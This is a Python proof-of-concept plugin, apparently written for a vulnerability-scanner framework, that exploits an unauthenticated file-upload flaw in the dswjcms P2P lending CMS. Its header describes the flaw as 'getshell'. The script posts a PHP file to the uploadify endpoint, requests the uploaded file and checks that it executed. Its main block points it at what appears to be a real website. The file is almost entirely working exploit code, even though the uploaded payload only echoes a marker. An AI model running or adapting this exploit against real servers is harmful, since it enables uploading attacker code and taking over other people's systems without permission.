#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = P4NY
#_PlugName_ = 某P2P网贷系统(dswjcms)前台getshell
#__Refer___ = http://wooyun.org/bugs/wooyun-2015-0141209
import re,urlparse
def assign(service, arg):
    if service == 'dswjcms':
        return True, arg
def audit(arg):
    p=urlparse.urlparse(arg)
    raw="""POST /Public/uploadify/uploadify.php HTTP/1.1
Host: {netloc}
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------32382156818478
Content-Length: 337

-----------------------------32382156818478
Content-Disposition: form-data; name=\"Filedata\"; filename=\"2.php\"
Content-Type: application/octet-stream

<?php
echo \"testvul~test\";
?>
-----------------------------32382156818478
Content-Disposition: form-data; name=\"Button1\"

Button
-----------------------------32382156818478--"""
    code, head, res, errcode, _ = curl.curl2(arg+'Public/uploadify/uploadify.php',raw=raw.format(scheme=p.scheme,netloc=p.netloc));
    if code == 200 and res:
            file_url='http://%s/Public/uploadify/uploads/%s'%(p.netloc,res)
            code,head,res,errcode, _=curl.curl2(file_url)
            if 'testvul~test' in res:
                security_hole(arg+":Upload File at "+file_url)
                
if __name__ == '__main__':
    from dummy import *
    audit(assign('dswjcms', 'http://hm.bjdjyx.com/')[1])